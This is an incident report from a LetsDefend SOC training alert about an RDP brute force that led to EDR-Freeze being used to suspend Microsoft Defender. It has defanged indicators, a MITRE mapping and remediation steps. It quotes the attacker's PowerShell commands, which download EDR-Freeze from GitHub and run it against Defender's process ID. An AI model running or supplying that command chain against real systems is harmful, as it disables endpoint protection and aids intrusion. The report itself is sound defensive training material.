# SOC334: EDR Tampering Attempt via EDR-Freeze

|                      |                                 |
| -------------------- | ------------------------------- |
| **Platform**         | LetsDefend                      |
| **Severity**         | High                            |
| **Verdict**          | True Positive                   |
| **Affected host**    | WS-Prod-02 (172[.]16[.]20[.]69) |
| **Affected account** | LetsDefendsvc (service account) |

---

## Summary (What happened)

A successful RDP brute-force attack compromised the service account (LetsDefendsvc) on a production host (WS-Prod-02). The attacker then executed a series of PowerShell commands to download `EDR-Freeze_1.0.zip`. The archive was extracted and `EDR-Freeze_1.0.exe` was executed for 10 seconds. It spawned `WerFaultSecure.exe` to manipulate a frozen process and disabled Microsoft Defender Real-Time Protection.

Based on the scripting history reviewed, no other malicious activity was found.

## Timeline (When it happened)

| Time     | Event                                                                                     |
| -------- | ----------------------------------------------------------------------------------------- |
| 12:59:43 | `212[.]8[.]243[.]56` initiated RDP brute-force attempts against WS-Prod-02                |
| —        | Attacker obtained valid credentials for LetsDefendsvc on the 5th attempt (per log search) |

## Artifacts (Indicators of Compromise)

| Type         | Value                                                                                          |
| ------------ | ---------------------------------------------------------------------------------------------- |
| IP address   | `212[.]8[.]243[.]56`                                                                           |
| Download URL | `hxxps[://]github[.]com/TwoSevenOneT/EDR-Freeze/releases/download/main/EDR-Freeze_1[.]0[.]zip` |
| MD5 hash     | `2c8fbd0f7fd0ed8ebcacb087c8faa6f3`                                                             |

**Suspicious terminal executions on the host:**

```powershell
whoami
systeminfo
Invoke-WebRequest -Uri 'https://github.com/TwoSevenOneT/EDR-Freeze/releases/download/main/EDR-Freeze_1.0.zip' -OutFile "$env:USERPROFILE\Downloads\EDR-Freeze_1.0.zip"
cd $env:USERPROFILE\Downloads
Expand-Archive -Path "$env:USERPROFILE\Downloads\EDR-Freeze_1.0.zip" -DestinationPath "$env:USERPROFILE\Downloads" -Force
Get-Process -Name MsMpEng | Select-Object Id, ProcessName
.\EDR-Freeze_1.0.exe 6080 10000
```

The commands enumerate the host (`whoami`, `systeminfo`), download and extract the tool, identify Defender's process (`MsMpEng`), then run the EDR-Freeze binary against it — freezing the Defender process via `WerFaultSecure.exe` for 10 seconds while real-time protection was disabled.

## MITRE ATT&CK Mapping

| Technique                                | ID        |
| ---------------------------------------- | --------- |
| Brute Force                              | T1110     |
| Remote Desktop Protocol                  | T1021.001 |
| PowerShell                               | T1059.001 |
| System Owner/User Discovery              | T1033     |
| System Information Discovery             | T1082     |
| Ingress Tool Transfer                    | T1105     |
| Impair Defenses: Disable or Modify Tools | T1562.001 |
| Indicator Removal                        | T1070     |

## Root Cause (Why it happened)

The incident started with the service account being compromised via an RDP brute-force attack against the production host. Once inside, the attacker downloaded and executed `EDR-Freeze_1.0.exe`, which manipulated the Defender process and disabled real-time protection monitoring.

## Impact (Who/What was affected)

Based on the data gathered during the investigation:

- Host WS-Prod-02 is compromised.
- Account LetsDefendsvc's credentials are compromised.
- Sensitive information may have been exfiltrated.

## Action Taken (How it was fixed)

- Isolated host WS-Prod-02 (172[.]16[.]20[.]69) using EDR containment.
- Deleted `EDR-Freeze_1.0.zip` and `EDR-Freeze_1.0.exe` from the Downloads folder.

In a real-world scenario, this would be followed by:

- Searching the logs and identifying any further unusual activity on the host.
- Investigating for lateral movement.

## Recommendations (Future prevention)

1. Block the attacker's IP globally.
2. Reset any compromised user credentials.
3. Reimage the device and restore from a clean backup.
4. Remove internet exposure of RDP. If it must be reachable, use a VPN or bastion host.
5. Enforce account lockout and MFA.

## Investigation Notes

- PowerShell history can be reviewed by connecting to the host: `ConsoleHost_history.txt`.
- Check the metadata of the downloaded file: `Get-Item "C:\Users\LetsDefend\Downloads\EDR-Freeze_1.0.exe" | Format-List *`
- Check Microsoft Defender's current status: `Get-MpComputerStatus`
